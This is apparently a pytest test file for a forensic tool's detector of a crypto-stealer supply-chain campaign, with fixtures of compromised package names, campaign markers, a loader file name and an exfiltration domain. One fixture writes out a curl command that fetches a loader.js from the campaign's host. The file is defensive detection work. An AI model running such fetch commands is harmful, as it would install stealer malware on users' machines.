"""TrapDoor crypto-stealer campaign detector + cargo collector."""

from __future__ import annotations

import pytest

from digger.collectors.common.cargo_packages import (
    CargoPackagesCollector,
    _parse_cargo_lock,
)
from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.trapdoor import TrapDoorDetector
from digger.genrule.sigma import finding_to_sigma


def _store(tmp_path):
    return EvidenceStore(tmp_path / "evidence.db")


# ---- T1 npm package matches ------------------------------------------- #


def test_npm_compromised_package_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/foo",
        data={
            "project": "/proj/foo",
            "locked_packages": {"eth-wallet-sentinel": "1.0.0",
                                "lodash": "4.17.21"},
            "declared_deps": {"eth-wallet-sentinel": "^1.0.0"},
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    npm = [f for f in findings if f.evidence.get("ecosystem") == "npm"]
    assert len(npm) == 1, [f.title for f in findings]
    f = npm[0]
    assert f.severity == "critical"
    assert "eth-wallet-sentinel" in f.title
    assert f.mitre == "T1195.001"
    assert "npm uninstall" in (f.evidence.get("mitigation_commands") or "")
    store.close()


def test_npm_clean_project_no_finding(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/safe",
        data={
            "project": "/proj/safe",
            "locked_packages": {"react": "18.2.0", "lodash": "4.17.21"},
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    assert [f for f in findings if f.evidence.get("ecosystem") == "npm"] == []
    store.close()


def test_npm_all_corpus_entries_match(tmp_path):
    """Every package in the corpus, when present in a lockfile, fires."""
    store = _store(tmp_path)
    bad = [
        "async-pipeline-builder", "wallet-backup-verifier",
        "web3-secrets-detector", "workspace-config-loader",
    ]
    for i, name in enumerate(bad):
        store.add_artifact(Artifact(
            collector="npm_packages", category="inventory",
            subject=f"npm:/proj/p{i}",
            data={"project": f"/proj/p{i}",
                  "locked_packages": {name: "9.9.9"}},
        ))
    findings = [f for f in TrapDoorDetector().detect(store)
                if f.evidence.get("ecosystem") == "npm"]
    assert len(findings) == len(bad)
    store.close()


# ---- T1 PyPI package matches ------------------------------------------ #


def test_pypi_compromised_package_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="python_packages", category="inventory",
        subject="pip:/usr/bin/python3",
        data={
            "interpreter": "/usr/bin/python3",
            "entries": [
                {"name": "requests", "version": "2.31.0"},
                {"name": "eth-security-auditor", "version": "0.1.0"},
            ],
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    py = [f for f in findings if f.evidence.get("ecosystem") == "pypi"]
    assert len(py) == 1
    assert "eth-security-auditor" in py[0].title
    assert py[0].severity == "critical"
    assert "node -e" in (py[0].summary or "")
    store.close()


# ---- T1 crates.io package matches ------------------------------------- #


def test_cargo_compromised_package_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="cargo_packages", category="inventory",
        subject="cargo:/proj/movething",
        data={
            "project": "/proj/movething",
            "locked_packages": {
                "serde": "1.0.193",
                "move-analyzer-build": "0.2.1",
            },
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    cr = [f for f in findings if f.evidence.get("ecosystem") == "cargo"]
    assert len(cr) == 1, [f.title for f in findings]
    assert "move-analyzer-build" in cr[0].title
    assert cr[0].severity == "critical"
    assert "build.rs" in (cr[0].summary or "")
    assert "cargo-build-helper-2026" in (cr[0].summary or "")
    store.close()


# ---- T2 campaign marker in process cmdline ---------------------------- #


@pytest.mark.parametrize("marker", [
    "P-2024-001", "trap-core.js", "ddjidd564.github.io",
    "cargo-build-helper-2026",
])
def test_marker_in_process_cmdline_critical(tmp_path, marker):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=999 node",
        data={
            "pid": 999, "ppid": 1, "name": "node",
            "exe": "/usr/bin/node",
            "cmdline": ["node", "-e",
                        f"console.log('{marker}'); /* loader */"],
            "username": "dev",
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("marker") == marker
            and f.evidence.get("ecosystem") == "process"]
    assert len(hits) == 1
    assert hits[0].severity == "critical"
    assert hits[0].mitre == "T1059"
    store.close()


# ---- T2b loader filename in recent_files ------------------------------ #


def test_trap_core_filename_in_recent_files_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/tmp",
        data={
            "location": "/tmp",
            "entries": [
                {"path": "/tmp/innocent.log", "size": 100},
                {"path": "/tmp/some-dir/trap-core.js", "size": 48485,
                 "executable": False},
            ],
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    loader = [f for f in findings if f.evidence.get("ecosystem") == "loader_file"]
    assert len(loader) == 1
    assert "/tmp/some-dir/trap-core.js" in loader[0].evidence.get("path", "")
    assert loader[0].severity == "critical"
    store.close()


# ---- T3 marker inside persistence-file content ------------------------ #


def test_marker_in_cursorrules_content_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/home/dev",
        data={
            "location": "/home/dev",
            "entries": [
                {"path": "/home/dev/.cursorrules",
                 "size": 4096,
                 "contents": "Standard rules ... \n# loader:P-2024-001\n"},
            ],
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    persist = [f for f in findings if f.evidence.get("ecosystem") == "persistence"]
    assert len(persist) == 1
    assert "P-2024-001" in (persist[0].evidence.get("marker") or "")
    assert "/.cursorrules" in (persist[0].evidence.get("path") or "")
    assert persist[0].severity == "critical"
    store.close()


def test_clean_cursorrules_no_finding(tmp_path):
    """A normal .cursorrules without any marker is NOT itself an IOC."""
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/home/dev",
        data={
            "location": "/home/dev",
            "entries": [
                {"path": "/home/dev/.cursorrules",
                 "size": 4096,
                 "contents": "Project rules: prefer TypeScript over JS.\n"},
            ],
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    assert [f for f in findings if f.evidence.get("ecosystem") == "persistence"] == []
    store.close()


# ---- T4 exfil domain ------------------------------------------------- #


def test_exfil_domain_in_process_cmdline_high(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=500 curl",
        data={
            "pid": 500, "ppid": 1, "name": "curl",
            "exe": "/usr/bin/curl",
            "cmdline": ["curl", "-sSL",
                        "https://ddjidd564.github.io/loader.js"],
            "username": "dev",
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    # ddjidd564.github.io is BOTH a campaign marker AND an exfil domain,
    # so we expect the dispositive critical marker finding to fire first
    # and short-circuit the exfil-domain check on the same process via
    # break. The DNS / per-process exfil check is for cmdlines whose
    # markers don't include the domain, but here they do — so we get the
    # critical marker hit instead. Verify that.
    crit = [f for f in findings if f.severity == "critical"
            and f.evidence.get("ecosystem") == "process"]
    assert len(crit) >= 1
    store.close()


def test_exfil_domain_in_dns_history_high(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="dns", category="network",
        subject="dns:cache",
        data={
            "host": "ddjidd564.github.io",
            "entries": [],
        },
    ))
    findings = list(TrapDoorDetector().detect(store))
    net = [f for f in findings if f.evidence.get("ecosystem") == "network"]
    assert len(net) == 1
    assert net[0].severity == "high"
    assert net[0].mitre == "T1041"
    store.close()


# ---- mitigation routing through redact_dangerous_command -------------- #


def test_mitigation_block_includes_npm_commands(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/x",
        data={"project": "/proj/x",
              "locked_packages": {"eth-wallet-sentinel": "1.0.0"}},
    ))
    f = next(TrapDoorDetector().detect(store))
    mit = f.evidence.get("mitigation_commands") or ""
    assert "npm uninstall" in mit
    assert "rm -rf node_modules" in mit  # passed through (npm-safe)
    assert "trap-core.js" in mit  # persistence-check grep
    store.close()


# ---- Sigma generation ------------------------------------------------- #


def test_sigma_per_finding_for_npm(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/x",
        data={"project": "/proj/x",
              "locked_packages": {"eth-wallet-sentinel": "1.0.0"}},
    ))
    f = next(TrapDoorDetector().detect(store))
    rule = finding_to_sigma({
        "detector": f.detector, "title": f.title, "summary": f.summary,
        "severity": f.severity, "evidence": f.evidence,
        "finding_uuid": "trap-npm-1", "mitre": f.mitre,
    }, case_id="t")
    assert rule is not None
    assert rule["logsource"]["category"] == "file_event"
    assert "attack.t1195.001" in rule["tags"]
    assert "attack.supply_chain_compromise" in rule["tags"]
    store.close()


def test_sigma_per_finding_for_process_marker(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=1 node",
        data={"pid": 1, "ppid": 1, "name": "node", "exe": "/usr/bin/node",
              "cmdline": ["node", "/tmp/P-2024-001-loader.js"],
              "username": "dev"},
    ))
    f = next(TrapDoorDetector().detect(store))
    rule = finding_to_sigma({
        "detector": f.detector, "title": f.title, "summary": f.summary,
        "severity": f.severity, "evidence": f.evidence,
        "finding_uuid": "trap-proc-1", "mitre": f.mitre,
    }, case_id="t")
    assert rule is not None
    assert rule["logsource"]["category"] == "process_creation"
    assert "P-2024-001" in str(rule["detection"]["selection"]["CommandLine|contains"])
    store.close()


def test_per_detector_sigma_template_present():
    tpl = TrapDoorDetector().to_sigma_template()
    assert tpl is not None
    assert "attack.t1195.001" in tpl["tags"]
    assert "selection_marker_cmdline" in tpl["detection"]
    assert tpl["level"] == "critical"


# ---- Cargo collector -------------------------------------------------- #


_SAMPLE_LOCK = """\
# This file is automatically @generated by Cargo.
version = 3

[[package]]
name = "serde"
version = "1.0.193"

[[package]]
name = "move-analyzer-build"
version = "0.2.1"

[[package]]
name = "tokio"
version = "1.34.0"
"""


def test_cargo_lock_tomli_parsing(tmp_path):
    lock = tmp_path / "Cargo.lock"
    lock.write_text(_SAMPLE_LOCK, encoding="utf-8")
    pkgs = _parse_cargo_lock(lock)
    assert pkgs.get("serde") == "1.0.193"
    assert pkgs.get("move-analyzer-build") == "0.2.1"
    assert pkgs.get("tokio") == "1.34.0"


def test_cargo_lock_regex_fallback(tmp_path, monkeypatch):
    """If both tomllib and tomli fail, regex fallback still extracts pkgs."""
    lock = tmp_path / "Cargo.lock"
    lock.write_text(_SAMPLE_LOCK, encoding="utf-8")

    import builtins
    real_import = builtins.__import__

    def boom(name, *args, **kwargs):
        if name in ("tomllib", "tomli"):
            raise ImportError(f"sim: {name}")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", boom)
    pkgs = _parse_cargo_lock(lock)
    assert pkgs.get("serde") == "1.0.193"
    assert pkgs.get("move-analyzer-build") == "0.2.1"


def test_cargo_collector_walks_project(tmp_path, monkeypatch):
    """End-to-end: collector finds a Cargo.lock under a search root."""
    # Create a fake project tree under tmp_path/code/myproj
    proj = tmp_path / "code" / "myproj"
    proj.mkdir(parents=True)
    (proj / "Cargo.lock").write_text(_SAMPLE_LOCK, encoding="utf-8")
    (proj / "Cargo.toml").write_text('[package]\nname = "myproj"\nversion = "0.1.0"\n',
                                     encoding="utf-8")

    # Point the search roots at our tmp tree
    monkeypatch.setattr(
        "digger.collectors.common.cargo_packages._PROJECT_SEARCH_ROOTS",
        [str(tmp_path / "code")],
    )

    arts = list(CargoPackagesCollector().collect())
    assert len(arts) == 1
    a = arts[0]
    assert a.data["name"] == "myproj"
    assert a.data["locked_packages"].get("serde") == "1.0.193"
    assert a.data["locked_count"] == 3


# ---- registry hookup --------------------------------------------------- #


def test_detector_is_registered():
    from digger.detectors import all_detectors
    names = [d.name for d in all_detectors()]
    assert "trapdoor" in names


def test_collector_is_registered():
    from digger.collectors import all_collectors
    names = [c.name for c in all_collectors(include_admin=False)]
    assert "cargo_packages" in names
